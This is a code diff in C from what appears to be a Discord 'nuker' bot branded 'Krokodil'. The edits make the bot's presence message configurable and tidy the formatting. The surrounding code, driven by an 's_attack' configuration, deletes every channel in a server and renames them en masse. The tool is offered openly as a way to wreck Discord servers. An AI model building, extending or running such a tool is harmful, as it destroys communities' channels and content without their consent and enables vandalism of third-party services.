@@ -135,8 +135,7 @@ void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
             client,
             channels[i]->id,
             &(struct discord_modify_channel_params){
-                .name = channel_name
-            },
+                .name = channel_name},
             NULL);
         i++;
     }
@@ -147,29 +146,35 @@ void on_ready(struct discord *client)
     const struct discord_user *bot = discord_get_self(client);
     log_info("Logged in as %s!", bot->username);
 
-    discord_set_presence(client, &(struct discord_presence_status){
-                                     .activities =
-                                         (struct discord_activity *[]){
-                                             &(struct discord_activity){
-                                                 .name = "#KrokodilOnTop",
-                                                 .type = DISCORD_ACTIVITY_GAME,
-                                                 .details = "Nuking with style",
-                                             },
-                                             NULL},
-                                     .status = "idle",
-                                     .afk = false,
-                                     .since = discord_timestamp(client),
-                                 });
-
     log_info("NAME: %s", s_attack.mass_channel_name);
     u64_snowflake_t guild_id = get_guild(client);
+
+    char *presence_name = strtok(s_attack.presence_name, "");
+    char *presence_status = strtok(s_attack.presence_status, "");
+
+    if (s_attack.presence_enabled)
+    {
+        discord_set_presence(client, &(struct discord_presence_status){
+                                         .activities =
+                                             (struct discord_activity *[]){
+                                                 &(struct discord_activity){
+                                                     .name = presence_name,
+                                                     .type = s_attack.presence_type,
+                                                     .details = "Krokodil Everywhere",
+                                                 },
+                                                 NULL},
+                                         .status = presence_status,
+                                         .afk = false,
+                                         .since = discord_timestamp(client),
+                                     });
+    }
 
     if (s_attack.channel_delete_all == true)
     {
         delete_all_channels(client, guild_id);
     }
 
-    if(s_attack.rename_channel_enabled == true) 
+    if (s_attack.rename_channel_enabled == true)
     {
         rename_all_channels(client, guild_id, s_attack.rename_channel_name);
     }
